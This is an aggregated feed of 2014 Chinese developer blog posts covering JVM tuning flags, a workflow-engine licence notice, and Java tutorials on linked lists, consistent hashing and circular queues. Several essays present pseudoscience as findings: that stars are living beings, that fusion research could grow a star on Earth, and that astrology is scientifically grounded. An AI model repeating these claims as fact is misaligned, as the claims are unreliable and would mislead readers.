JAVA_OPTS="-server -XX:+UseParNewGC -Xms1024m -Xmx2048m -XX:MaxNewSize=128m -XX:NewSize=128m -XX:PermSize=96m -XX:MaxPermSize=128m -XX:+UseConcMarkSweepGC -XX:+CMSPermGenSweepingEnabled -verbose:gc -XX:+PrintGCDetails -XX:+PrintGCTimeStamps -XX:CMSInitiatingOccupancyFraction=1 -XX:+CMSIncrementalMode -XX:MaxTenuringThreshold=0 -XX:SurvivorRatio=20000 -XX:+UseCMSCompactAtFullCollection -XX:CMSFullGCsBeforeCompaction=0  -XX:CMSIncrementalDutyCycleMin=10 -XX:CMSIncrementalDutyCycle=30 -XX:CMSMarkStackSize=8M -XX:CMSMarkStackSizeMax=32M"
　　前端应用参数配置：
JAVA_OPTS="-server  -Xmx4096m -Xms4096m -Xmn480m -Xss256k -XX:PermSize=128m -XX:MaxPermSize=256m -XX:+UseConcMarkSweepGC -XX:ParallelGCThreads=8 -XX:CMSFullGCsBeforeCompaction=0
-XX:+UseCMSCompactAtFullCollection -XX:SurvivorRatio=8 -XX:MaxTenuringThreshold=7 -XX:GCTimeRatio=19
-Xnoclassgc -XX:+DisableExplicitGC -XX:+UseParNewGC -XX:-CMSParallelRemarkEnabled -XX:CMSInitiatingOccupancyFraction=70 -XX:SoftRefLRUPolicyMSPerMB=0"
　　参数说明：
　　-Xmx1280m：设置JVM最大可用内存为1280m。最大可设为3550m。具体应用可适当调整。
　　-Xms1280m：设置JVM初始内存为1280m。此值可以设置与-Xmx相同，以避免每次垃圾回收完成后JVM重新分配内存。
　　-Xmn480m：设置年轻代大小为480m。整个堆大小=年轻代大小 + 年老代大小 + 持久代大小。持久代一般固定大小为64m，所以增大年轻代后，将会减小年老代大小。此值对系统性能影响较大，Sun官方推荐配置为整个堆的3/8。
　　-Xss256k：设置每个线程的堆栈大小。JDK5.0以后每个线程堆栈大小为1M，以前每个线程堆栈大小为256K。更具应用的线程所需内存大小进行调整。在相同物理内存下，减小这个值能生成更多的线程。但是操作系统对一个进程内的线程数还是有限制的，不能无限生成，经验值在3000~5000左右。
　　-XX:PermSize=64m：指定 jvm 中 Perm Generation 的最小值。 这个参数需要看你的实际情况。可以通过jmap 命令看看到底需要多少。
　　-XX:MaxPermSize=128m：指定 Perm Generation 的最大值
　　-XX:+UseConcMarkSweepGC：设置并发收集器
　　-XX:ParallelGCThreads=8：配置并行收集器的线程数，即：同时多少个线程一起进行垃圾回收。此值最好配置与处理器数目相等。
　　-XX:CMSFullGCsBeforeCompaction=0：由于并发收集器不对内存空间进行压缩、整理，所以运行一段时间以后会产生“碎片”，使得运行效率降低。此值设置运行多少次GC以后对内存空间进行压缩、整理。
　　-XX:+UseCMSCompactAtFullCollection：打开对年老代的压缩。可能会影响性能，但是可以消除碎片。
　　-XX:SurvivorRatio=8：每个survivor space 和 eden之间的比例。
　　-XX:MaxTenuringThreshold=7：设置垃圾最大年龄。如果设置为0的话，则年轻代对象不经过Survivor区，直接进入年老代。对于年老代比较多的应用，可以提高效率。如果将此值设置为一个较大值，则年轻代对象会在Survivor区进行多次复制，这样可以增加对象再年轻代的存活时间，增加在年轻代即被回收的概率。
　　-XX:GCTimeRatio=19：设置垃圾回收时间占程序运行时间的百分比，公式为1/(1+n)。
　　-Xnoclassgc：禁用类垃圾回收，性能会有一定提高。
　　-XX:+DisableExplicitGC：当此参数打开时，在程序中调用System.gc()将会不起作用。默认是off。
　　-XX:+UseParNewGC：设置年轻代为并行收集。可与CMS收集同时使用。
　　-XX:-CMSParallelRemarkEnabled：在使用 UseParNewGC 的情况下 , 尽量减少 mark 的时间。
　　-XX:CMSInitiatingOccupancyFraction=70：指示在 old generation 在使用了 70% 的比例后 , 启动 concurrent collector。
　　-XX:SoftRefLRUPolicyMSPerMB=0：每兆堆空闲空间中SoftReference的存活时间。
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
[宇宙世纪]星际迷航中的情节, comsci.iteye.com.blog.2063514, Thu, 08 May 2014 08:51:39 +0800
   星际迷航电影中,人类第一次实现了曲速飞行,然后外星人探测到曲速信号,派遣考察船来地球,和人类建立起第一次接触....    这是电影里面的情节,而现实的情况是: 我们已经实现了超空间跳跃,并向银河系发射了大量的信息,并没有什么外星文明来和我们进行任何官方形式的接触...而根据我们这些爱好者的观测,可能真正的外星文明并不是派遣什么考察船来和我们接触,而是派遣一个黑洞群过来吞噬太阳系的灵魂... 因为外星文明早就摆脱了细胞生命的演化阶段,一出生就是一个小银河.....所以,引起他们的注意,后果比较严重.....   所以,我们小小的地球上面的人类还是老老实实的玩点网络游戏吧...不要搞什么超时空战列舰了....一来是太贵了,二来是比较麻烦.三是会引起宇宙中其它高级文明的焦虑,鬼知道他们会怎么对付我们呢?
              
              
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
[太阳时空层]论受控核聚变的危险性, comsci.iteye.com.blog.2059493, Sun, 04 May 2014 08:33:43 +0800
     实际上,恒星是有生命的,尺度再小的聚变球体都具有生命的形态,它需要吸收外界的物质和能量,更需要足够的空间来生长和学习,也具有时间效应,所以用金属壳体把一个小的聚变球体封闭起来...就好像你小时候把你关在黑屋子里面一样,你肯定不会快乐,甚至会自杀的..生命需要自由,虽然我们的物理学家并不认为聚变球体是生命,但是我要警告地球上从事受控聚变研究的专家们.....一个聚变体就是一个恒星的种子...在地球上面从事聚变研究是非常危险的.....有那种精力和时间,不如把太阳能电池板的光电转换效率提高10个百分点........    要从事聚变研究,最好在广阔的宇宙中去进行相关实验,地球上搞这种东西,太危险了.. 恒星的种子一旦在地球上成长起来,后果不堪设想........
              
              
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
祝大家5.1国际劳动节快乐, comsci.iteye.com.blog.2059046, Thu, 01 May 2014 08:18:58 +0800
         今天是5.1国际劳动节,COMSCI在这里祝全世界的劳动者,退休的劳动者,即将走入工作岗位的劳动者节日快乐,万事如意....红包多多..前程远大    也祝全世界的开源工作者生活幸福,工作顺利,自己的开源项目有更多的人使用.....
              
              
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
[JWFD开源工作流]基于JWFDv0.97自动数据处理系统实现图形化计算开发工程的设想, comsci.iteye.com.blog.2056218, Mon, 28 Apr 2014 16:33:12 +0800
   用拖拽的方式,绘制出一个流程图,其中包含分支和汇聚等拓扑结构,然后在每个节点中嵌入一个很基础而简单的公式模块....在目前没有实现反馈运行的情况下,仅仅用一次运行过程实现对一个复杂数学计算工程的运行控制,我觉得完全可行,如果要实现逐次逼近的计算,那么非得要实现流程反馈,在工程上,这种图形化计算的意义非常巨大,如果实现这种图形化的计算方法,加上大规模流程图的数据结构的完善,我们的程序员以后可以摆脱对每一个具体的项目都进行编码的繁琐工作了,我的意思是一旦我们实现了图形化计算,那么图形化编程也为期不远了,用触摸屏+图形拖拽实现计算或者编程的轻松日子离我们越来越近了.....   大家加油啊.....向着新的技术领域和科学高峰前进.....      JWFD只有进行时,没有完成时,嘿嘿...发现问题就马上修改,想到可以实现的功能就马上完成,然后第一时间发布在网络上面,互联网的众多开发者就可以迅速获得一种信号来触发自己手中的开发过程,然后涌现就会出现.........大家团结一致,强人工智能一定会实现....
              
              
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
JWFD开源工作流自动授权说明, comsci.iteye.com.blog.2056070, Mon, 28 Apr 2014 11:15:23 +0800
    JWFD开源工作流系统(包括JWFD工作流设计器,JWFD-XML数据解析模块,JWFD数据库结构,JWFD工作流引擎-自动运行控制器ARC,JWFD工作流引擎-节点回退算法模块,JWFD工作流引擎-节点匹配搜索算法模块,JWFD工作流引擎-二次开发接口API集合包,JWFD工作流数据库-矩阵数据结构模块....),版本号从V0.92-V0.97的官方发布版本的作者:  网名 COMSCI(英文)  姓名:尧庆宇(中华人民共和国公民,出生年月日:公元1977年9月30日,户口所在地-四川省成都市) 毕业院校:四川大学电气信息学院-自动控制与计算机应用专业毕业,大专学历,英语CET-4级 JWFD开源工作流系统并未在地球上任何国家申请任何著作权和任何专利,JWFD自诞生以来一直得到整个互联网和全世界开源爱好者的大力支持,因此凡是使用JWFD代码并在此基础上作出哪怕一行代码贡献,报告过任何一处BUG,在自己的网络社区中分享过JWFD代码和文档,以及利用JWFD开源工作流代码和文档为自己,自己的客户,自己的老板获得了任何奖励(物质和精神)的朋友均自动获得comsci先生的JWFD开源工作流系统的无限期官方授权,再次感谢大家的支持,COMSCI将继续完善和升级JWFD开源工作流系统的代码和文档......    
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
[COMSCI]2014.4.23最新更新, comsci.iteye.com.blog.2053205, Wed, 23 Apr 2014 16:12:37 +0800
   前几天和一个工作流爱好者在商量着将JWFD的设计器中的一个重要功能-绘制节点间折线(贝赛尔曲线)功能用修改JGRAPH源代码的方式实现了，现在已经做到通过添加代码段，实现在设计器中进行节点间连接折线的功能，但是由于要修改JGRAPH的源代码以实现自定义节点间连接线二维空间坐标属性的保存和回显，所以暂时没有发布新的升级补丁   这一段时间由于需要经常在外面去办事，所以博客更新不是那么频繁，请大家原谅,如果遇到在JWFD开源工作流的代码和文档上面有任何问题，请给我发邮件EMAIL:comsci@163.com 或者QQ留言:784092877  我尽量在第一时间给大家回复.....      
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
[恒星能源]恒星能源的来源是多种多样的, comsci.iteye.com.blog.2050269, Mon, 21 Apr 2014 08:51:43 +0800
    我们的太阳和其它宇宙空间中的恒星天体为什么能够燃烧数十亿年呢? 除了最初发现的大质量物体内部产生的内能提供一部分燃烧能源之外,氢元素及其同位素的聚变也是支持恒星燃烧的一种能源形式,但是我们觉得恒星要燃烧如此漫长的岁月,不吸收宇宙空间的外来质量和能量使其成为自己燃烧的能源是不可思议的... 恒星也是一种生命,既然是生命,肯定也需要吞噬其它天体作为自己的食物,说句通俗的话,作为一只熊,它不可能不吃其它动物的肉就能够长那么大...........   宇宙空间中的暗能量,暗物质,星云气体,行星,小行星,慧星,甚至其它小质量的恒星都有可能成为一颗大质量恒星为维持自身生长而需要的能源的来源..........   另外,根据我们的研究,恒星除了把质量和能量作为燃烧的资源之外,时间和空间也是恒星燃烧的资源,也就是说,一颗恒星的寿命除了和我们上面这些因素有关之外,还和恒星天体所占据的宇宙空间的尺度和时间的尺度有关........   我们伟大的太阳,当消耗掉自己的氢燃料之后,在铁元素聚变极限来临之前,会吞噬太阳系内部的很多行星,包括我们地球....... 
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
[轨道计算]让地球获得大尺度空间信号接收能力, comsci.iteye.com.blog.2048118, Fri, 18 Apr 2014 08:49:27 +0800
     我们根据太阳系轨道计算工程学原理中土星光环的信号接收和发射功能来推导,地球磁场也可以通过一个类似土星光环那样的自然天体轨道向宇宙中发射地球的信号,并从宇宙中接收其它天体的辐射信号,那么发射一些带有象形文字图案的天然石制物体到地球轨道,并形成一个环状系统,是否可以让地球获得像土星那样的信号控制和发射功能呢?    
              
              
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
[云计算]私有云的崛起不可阻挡, comsci.iteye.com.blog.2047167, Wed, 16 Apr 2014 08:35:11 +0800
    以现在的PC机的价格和网络接入的速度,我相信每个家庭,再贫苦的人都有可能获得一个被自己控制的私有云计算系统,两个智能手机,一个平板电脑,一台PC机,两部笔记本电脑,最多加上一个NAS存储器,在自己家里建设一个私有云服务点是完全没有问题的....    现在的关键问题是网络接入服务的稳定性问题,域名已经不是问题了,美国不是已经放开DNS根节点服务器的管理权限了嘛.... 关键是线路问题....    解决线路最好的方法是用 卫星天线连接近地轨道或者低空飞翔的空间路由器,这样一来,我们就完全可以绕过地面障碍物,在高山和峡谷中接入网络.......    网络不处不在..... 私有云崛起不可阻挡...终结者已经成为数据中心的卫士...
              
              
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
[轨道计算]命运之轮-星体轨道计算方法的初步推理, comsci.iteye.com.blog.2045851, Mon, 14 Apr 2014 16:35:34 +0800
     命运之轮     星体轨道计算方法的初步推理      以我们人类的思维速度和记忆容量作为一个中值，一个零点     以我们人类的身体体积和所占的空间作为另外一个中值，一个零点      电子计算机是微观高速计算，星体轨道计算是宏观低速计算,两者的用途是完全不同的      电子计算机之所以运算速度快，是因为电子的传导速度是光速，而且电子的体积和人类的体积相比，也是要小上很多个数量级，利用高速电子的传递作为计算的基础,总体来看速度当然要比人类的思维高上很多倍      而我们把一颗星体看做一个基本的计算单元,星体的自传和公转轨道和周期作为一个基本的计算周期，与人类的思维速度和记忆容量相比,星体轨道计算速度就显得缓慢得多,但是存储容量要大无数倍,显然理解并应用这种计算法并不能够让我们获得同电子计算机一样的运算速度...      那么，我们为什么要去理解这种计算法呢？       因为星体轨道计算法并不是用来让我们获得比我们自身思维速度更快的计算速度和更大的信息存储容量的,而是让我们获得一种对大尺度时空进行观测的技术手段而应用的........       举个很简单的例子： 与一颗星体相比我们人类是一个小小的电子,我们的行为都发生在很短的时间周期内,比如说1个月,而且在这个周期内，我们的行为是不可预测的,是混沌的,随机的,但是我们人类的行为都是发生在某个自己所居住的星体的时空中的,那么和人类自身的空间尺度相比,整个星体自转和公转就算是宏观尺度了,那么星体的轨道如果不发生变化(一般是不会发生变化的)，那么以星体和星体周期运动作为一个时空观测单元,我们就能够获得相对稳定的关于我们自身这个微小的个体的整个生存周期内的宏观运行方向和计算结果(命运之轮)      简单的说就是，我们虽然无法准确掌握和我们自身一样大尺度的人的前进方向和轨迹,但是我们可以通过对宏观星体的轨道进行预测和计算来获得处于这个宏观星体时空中的这一类人的总体情况，也就是他们的命运,这里还有一个时空的概念      星体的具有时空场的记忆能力，也就是说具有把我们整个一生的所有事件都记录下来的存储能力，那么通过观测一个星体的运行和光芒，我们是否可以读取在这个时空场中很多不同的人的整个一生的命运呢？      可能我还没有用更加清晰和富有逻辑的语言来描述星体轨道计算法的意义，但是请原谅，我现在也只思考到这里，更多的更详细的相关思路和知识，将在以后陆续发布...      根据这个理论，我推测星座与时空预测，占星术等古代留下的魔法和占卜术是有科学根据的，是值得我们深入研究和思考的       
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
渣渣重走算法路之链表指定节点属性的删除和插入, mntms.iteye.com.blog.2064145, Fri, 09 May 2014 01:05:22 +0800

      我们知道数组是我们很熟悉的一种存放数据的东西，但是它的问题我们也知道，一经创建它的大小也就固定了，固定存在着一个重要的问题“内存浪费”和“内存溢出”，也就是它不能动态的变换它的大小，而链表就很好的解决了这个问题，它是动态的，大小随着加入和删除节点而变化着自己的大小，java自带的垃圾回收也会处理被删除的节点。释放出内存。我们还知道，数组在查看元素上面是它的强项，同过它的下标，时间复杂度为O(1),就能定位到元素，链表在这个方面就差一点了，因为要想查看一个元素，必须遍历链表找到相应的元素，时间复杂度到了O(n)，各有长处，也各有短处，这也像我们人一样嘛，人无完人，各有长短。
       今天写了一下链表，实现链表“指定属性对比”的插入和删除。链表的节点是我们自己定义的类型，当然可一封装我们自己的属性，可一放一个人，放一辆车等等，类当然就可以封装自己的属性。
 
    先定义一个简单的Link类，用它来生成对象，放到链表的每个节点上。代码如下：
      
package 链表;
/*
 * 节点类，封装了属性
 * @author TMS
 *
 */
public class Link {
	public int id;
	public double data;
	public Link next;         //定义下一个节点
	
	/*
	 * 初始化节点的属性
	 */
	public Link(int id,double data) {  
		this.id = id;
		this.data = data;
	}
   
	/*
	 * 打印出每个节点的信息
	 */
    public void displayLink() {
    	System.out.println("id = "+id+" "+"data = "+data);
    }
}
    接下来就是定义的一个链表类，相应的代码如下，有详细的注释：
    
package 链表;
public class Linklist {
	private Link first;
	
	/*
	 * 构造函数初始化第一个节点为null
	 */
	public Linklist() {
		first = null;
	}
	/*
	 * 在链表的头部插入一个元素
	 */
	public void insertFirst(int id, double data) {
		Link newLink = new Link(id, data);
		newLink.next = first;
		first = newLink;
	}
	 /*
	 * 指定匹配属性key查找相应的节点
	 * 使用循环遍历整个链表
	 */
	public Link findLink(int key) {
		Link temp = first;
		while (temp.id != key) {
			if (temp.next == null) {
				return null;
			} else {
				temp = temp.next;
			}
		}
		return temp;
	}
	/*
	 * 删除指定key值的节点
	 * 遍历整个链表找到对应的节点，找不到返回null
	 */
	public Link deletLink(int key) {
		Link temp = first;
		Link old = first;
		while (temp.id != key) {
			if (temp.next == null) {
				return null;               // 找到末尾了都没有找到
			} else {
				old = temp;
				temp = temp.next;
			}
		}                                  // 循环结束找到了
		if (temp == first)                 // 如果恰好要删除的是第一个节点，直接first = first.next;
			first = first.next;
		else
			old.next = temp.next;          //要删除的节点在中间
		return temp;                       
	}
	
	
	/*
	 * 打印链表中的节点
	 * 遍历打印整个链表
	 */
	public void displayList() {
		Link temp = first;
		while(temp != null) {
			temp.displayLink();
			temp = temp.next;
		}
	}
	
	/*
	 * 查看找到相应key值的节点
	 */
	public void lookFindNode(Link link) {
		if(link != null) {
			System.out.println("找到了相应的key值的节点 ："+link.data);
		}
		else{
			System.out.println("没有找到相应的key值的节点！");
		}
	}
	
	/*
	 * 查看删除相应key的节点
	 */
	public void lookdeletNode(Link link) {
		if(link != null) {
			System.out.println("节点已经删除，为："+link.data);
		}
		else {
			System.out.println("没有删除相应的节点");
		}
	}
	
	/*
	 * main方法进行测试
	 */
	public static void main(String[] args) {
		Linklist list = new Linklist();
		list.insertFirst(1, 10.0);
		list.insertFirst(2, 20.0);
		list.insertFirst(5, 30.0);
		list.insertFirst(7, 40.0);
		list.insertFirst(3, 50.0);
		
		System.out.println("打印插入的元素：");
		list.displayList();
		
		System.out.println("<------------------------------------------>");
		
		System.out.println("查找相应key值的节点：");
		Link l = list.findLink(8);
		list.lookFindNode(l);
		Link l2 = list.findLink(2);
		list.lookFindNode(l2);
		
		System.out.println("<------------------------------------------>");
		System.out.println("删除相应key值的节点：");
		Link l3 = list.deletLink(10);
		list.lookdeletNode(l3);
		
		Link l4 = list.deletLink(7);
		list.lookdeletNode(l4);
		
		System.out.println("删除后：");
		list.displayList();
		
	}
}
 
    测试输出结果：
   
打印插入的元素：
id = 3 data = 50.0
id = 7 data = 40.0
id = 5 data = 30.0
id = 2 data = 20.0
id = 1 data = 10.0
<------------------------------------------>
查找相应key值的节点：
没有找到相应的key值的节点！
找到了相应的key值的节点 ：20.0
<------------------------------------------>
删除相应key值的节点：
没有删除相应的节点
节点已经删除，为：40.0
删除后：
id = 3 data = 50.0
id = 5 data = 30.0
id = 2 data = 20.0
id = 1 data = 10.0
  
   PS:好，结束一天，洗洗睡了。链表的知识和形式还有很多，期待下一发。   
     
   
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
一致性哈希算法, mntms.iteye.com.blog.2063904, Thu, 08 May 2014 14:22:59 +0800

 
参考自：http://blog.csdn.net/wuhuan_wp/article/details/7010071
 
一致性哈希算法是分布式系统中常用的算法。比如，一个分布式的存储系统，要将数据存储到具体的节点上，如果采用普通的hash方法，将数据映射到具体的节点上，如key%N，key是数据的key，N是机器节点数，如果有一个机器加入或退出这个集群，则所有的数据映射都无效了，如果是持久化存储则要做数据迁移，如果是分布式缓存，则其他缓存就失效了。
    因此，引入了一致性哈希算法：
 
把数据用hash函数（如MD5），映射到一个很大的空间里，如图所示。数据的存储时，先得到一个hash值，对应到这个环中的每个位置，如k1对应到了图中所示的位置，然后沿顺时针找到一个机器节点B，将k1存储到B这个节点中。
如果B节点宕机了，则B上的数据就会落到C节点上，如下图所示：
 
这样，只会影响C节点，对其他的节点A，D的数据不会造成影响。然而，这又会造成一个“雪崩”的情况，即C节点由于承担了B节点的数据，所以C节点的负载会变高，C节点很容易也宕机，这样依次下去，这样造成整个集群都挂了。
       为此，引入了“虚拟节点”的概念：即把想象在这个环上有很多“虚拟节点”，数据的存储是沿着环的顺时针方向找一个虚拟节点，每个虚拟节点都会关联到一个真实节点，如下图所使用：
图中的A1、A2、B1、B2、C1、C2、D1、D2都是虚拟节点，机器A负载存储A1、A2的数据，机器B负载存储B1、B2的数据，机器C负载存储C1、C2的数据。由于这些虚拟节点数量很多，均匀分布，因此不会造成“雪崩”现象。
 
Java实现：
[java] view plaincopy
 
public class Shard<S> { // S类封装了机器节点的信息 ，如name、password、ip、port等  
  
    private TreeMap<Long, S> nodes; // 虚拟节点  
    private List<S> shards; // 真实机器节点  
    private final int NODE_NUM = 100; // 每个机器节点关联的虚拟节点个数  
  
    public Shard(List<S> shards) {  
        super();  
        this.shards = shards;  
        init();  
    }  
  
    private void init() { // 初始化一致性hash环  
        nodes = new TreeMap<Long, S>();  
        for (int i = 0; i != shards.size(); ++i) { // 每个真实机器节点都需要关联虚拟节点  
            final S shardInfo = shards.get(i);  
  
            for (int n = 0; n < NODE_NUM; n++)  
                // 一个真实机器节点关联NODE_NUM个虚拟节点  
                nodes.put(hash("SHARD-" + i + "-NODE-" + n), shardInfo);  
  
        }  
    }  
  
    public S getShardInfo(String key) {  
        SortedMap<Long, S> tail = nodes.tailMap(hash(key)); // 沿环的顺时针找到一个虚拟节点  
        if (tail.size() == 0) {  
            return nodes.get(nodes.firstKey());  
        }  
        return tail.get(tail.firstKey()); // 返回该虚拟节点对应的真实机器节点的信息  
    }  
  
    /** 
     *  MurMurHash算法，是非加密HASH算法，性能很高， 
     *  比传统的CRC32,MD5，SHA-1（这两个算法都是加密HASH算法，复杂度本身就很高，带来的性能上的损害也不可避免） 
     *  等HASH算法要快很多，而且据说这个算法的碰撞率很低. 
     *  http://murmurhash.googlepages.com/ 
     */  
    private Long hash(String key) {  
          
        ByteBuffer buf = ByteBuffer.wrap(key.getBytes());  
        int seed = 0x1234ABCD;  
          
        ByteOrder byteOrder = buf.order();  
        buf.order(ByteOrder.LITTLE_ENDIAN);  
  
        long m = 0xc6a4a7935bd1e995L;  
        int r = 47;  
  
        long h = seed ^ (buf.remaining() * m);  
  
        long k;  
        while (buf.remaining() >= 8) {  
            k = buf.getLong();  
  
            k *= m;  
            k ^= k >>> r;  
            k *= m;  
  
            h ^= k;  
            h *= m;  
        }  
  
        if (buf.remaining() > 0) {  
            ByteBuffer finish = ByteBuffer.allocate(8).order(  
                    ByteOrder.LITTLE_ENDIAN);  
            // for big-endian version, do this first:  
            // finish.position(8-buf.remaining());  
            finish.put(buf).rewind();  
            h ^= finish.getLong();  
            h *= m;  
        }  
  
        h ^= h >>> r;  
        h *= m;  
        h ^= h >>> r;  
  
        buf.order(byteOrder);  
        return h;  
    }  
 
}  
已有 1 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
“天”对不起, mntms.iteye.com.blog.2059835, Sun, 04 May 2014 20:58:15 +0800

        在这短短的不到一个月的时间里，电脑两次重装系统，第一次是由于ubutun，这一次你特么是在逗我么，重装系统算不了什么，可是我放在桌面上的重要的资料全都没有备份，由于平时养成的恶习，群里面下的东西，还有总是要看的东西，都放在了桌面上，一些写好的材料，要答辩的材料，就这样由于ubutun让我一下感觉世界少了什么东西。这钟心情。。。。。。
        每次重装完系统，又要预示着一夜不眠，各种各样的软件要重装，要配置，数据库，eclipse,xmapp,visual studiol,。。。。。。以湖大的网速，我下好那些软件都会蛋疼的要死，还好一些常用的开发工具我都备份了。
        今天windows再次崩了，又是重装，这个月我做了什么感动了上天，上天这么眷顾我。你可以再眷顾几次。重装，重装，重装。。。。。。
        今天是个好日子，编译原理和数字逻辑跪了，系统也跪了，明天数据库考试还是可以跪，只要我还没跪，你玩不死我。
 
       
已有 1 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
渣渣重走算法路之循环队列的实现, mntms.iteye.com.blog.2059821, Sun, 04 May 2014 20:20:19 +0800

        前天写了栈的实现，今天到队列了，好像明天要期中考试，还是三科，次奥，考吧考吧，五一三天已经贡献给你们了，考成什么样我也认了，毕竟智商在这里。说好的一天来一发，不要说我水，其实我还真的是水，上个学期数据结构课打酱油，这个学期又自己抱本书从第一页开始恭恭敬敬地学，不敢跳过一个字。估计是脑子里面灌浆了。上学期不认真。前车之鉴，希望筒子们好好的把数据结构学好。希望老夫子还为时不晚。
        队列和栈一样也是一种很基本的数据结构，队列的用途很多，下面是两个例子。
        第一个例子就是CPU资源的竞争问题。在具有多个终端的计算机系统中，有多个用户需要使用CPU各自运行自己的程序，   它们分别通过各自终端向操作系统提出使用CPU的请求，操作系统按照每个请求在时间上的先后顺序，将其排成一个队列，每次把CPU分配给队头用户使用，当相应的程序运行结束，则令其出队，再把CPU分配给新的队头用户，直到所有用户任务处理完毕。
         第二个例子就是主机与外部设备之间速度不匹配的问题。以主机和打印机为例来说明，主机输出数据给打印机打印 ，主机输出数据的速度比打印机打印的速度要快得多，若直接把输出的数据送给打印机打印，由于速度不匹配，显然是不行的。所以解决的方法是设置一个打印数据缓冲区，主机把要打印输出的数据依此写如到这个缓冲区中，写满后就暂停输出，继而去做其它的事情，打印机就从缓冲区中按照先进先出的原则依次取出数据并打印，打印完后再向主机发出请求，主机接到请求后再向缓冲区写入打印数据，这样利用队列既保证了打印数据的正确，又使主机提高了效率。
        通过上面的两个例子我们知道队列和栈之间的本质的区别了。栈是遵循先进后出，而队列则是遵循先进先出。由于它的先进先出，导致当队头的元素出来之后，队头的指针会上移，往队尾插入元素的时候队尾的指针也是往上移，这个和我们平时的生活经验可能不一样，以我们平时的生活经验，排队买票，队头的人买完票之后，后面的人会向前补上来，这一补可是所有的人都要往前移动一个位置，这在计算机的队列中就相当于要后面的所有元素都要往前进一个位置，这个开销是很大的，所以，计算机中的队列没有采取这样的方法。但是这样之后另外一个问题又出来了，当 把队头的元素移走之后，队头上移，我们知道，队列插入元素是从后面插入的，这就造成了队头前面的内存空出来了，而且还不能用了，因为我们不能把元素从队头插进去。于是乎，聪明的人们想到了循环队列这种东西。当队尾插不进去，队头前面又还有空位的时候，就把队尾下调到队头前面的位置，但记住他还是队尾，如此下去，就不会担心内存的浪费了。下面用图来解释一下： 
 
通过上面的两个图，应该能知道循环队列是怎么实现的了，就多了一个判断，哥哥画图可画了一个多小时。。。。
 
下面贴出代码，注释详细：
package 环形数组队列;
public class CricleQueue {
	/*
	 * 对列的长度
	 */
	private int maxSize;
	
	/*
	 * 队列数组
	 */
	private long[] queueArray;
	
	/*
	 * 头下标（指针）
	 */
	private int front;
	
	/*
	 * 尾下标（指针）
	 */
	private int rear;
	
	/*
	 * 队列中元素的个数
	 */
	private int nElement;
	
	/*
	 * 构造方法，初始化各种数据
	 */
	public CricleQueue(int maxSize) {
		this.maxSize = maxSize;
		queueArray = new long[maxSize];
		rear = -1;
		front = 0;
		nElement = 0;
	}
	
	/*
	 * 在队列的尾部插入一个元素
	 */
	public void insert(long value) {
		if(rear==maxSize-1){
			rear = -1;
		}
		queueArray[++rear] = value;
		nElement++;
	}
	
	/*
	 * 删除队头的元素
	 */
	public long remove() {
		long temp = queueArray[front++];
		if(front==maxSize) {
			front = 0;
		}
		nElement--;
		return temp;
	}
	
	
	/*
	 * 判断队列是否为空
	 */
	public boolean isEmpty() {
		return nElement==0;
	}
	
	/*
	 * 判断队列是否为满
	 */
	public boolean isFull() {
		return nElement==maxSize;
	}
	
	/*
	 * 查看队头元素
	 */
	
	public long peekF() {
		return queueArray[front];
	}
	
	/*
	 * 查看元素个数
	 */
	
	public int qSize() {
		return nElement;
	}
	
	
	public static void main(String[] args) {
		CricleQueue cq = new CricleQueue(5);
		
		System.out.println("队列是否为空："+cq.isEmpty());
		
		//插入元素
		cq.insert(1);
		cq.insert(2);
		cq.insert(3);
		System.out.println("队列是否满了："+cq.isFull());
		cq.insert(4);
		cq.insert(5);
		System.out.println("队列中元素个数："+cq.qSize());
		
		System.out.println("队列是否满了："+cq.isFull());
		System.out.println("对头的元素为："+cq.peekF());
		
		//移除两个元素
		cq.remove();
		cq.remove();
		System.out.println("队列中元素个数："+cq.qSize());
	
		System.out.println("对头的元素为："+cq.peekF());
		
		//插入两个元素
		cq.insert(6);
		cq.insert(7);
		System.out.println("队列中元素个数："+cq.qSize());
		
		System.out.println("队列是否满了："+cq.isFull());
		
		//移除四个元素
		cq.remove();
		cq.remove();
		cq.remove();
		cq.remove();
		System.out.println("队列中元素个数："+cq.qSize());
		System.out.println("对头的元素为："+cq.peekF());
		
	}
}
 
   输出结果：
 
队列是否为空：true
队列是否满了：false
队列中元素个数：5
队列是否满了：true
对头的元素为：1
队列中元素个数：3
对头的元素为：3
队列中元素个数：5
队列是否满了：true
队列中元素个数：1
对头的元素为：7
 
    就这样，队列的内存就不会被浪费掉了，只要里面有空的位置你就可以插入元素。
         
       
 
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
hadoop文件系统中文件复本的默认布局, mntms.iteye.com.blog.2059196, Fri, 02 May 2014 11:52:59 +0800

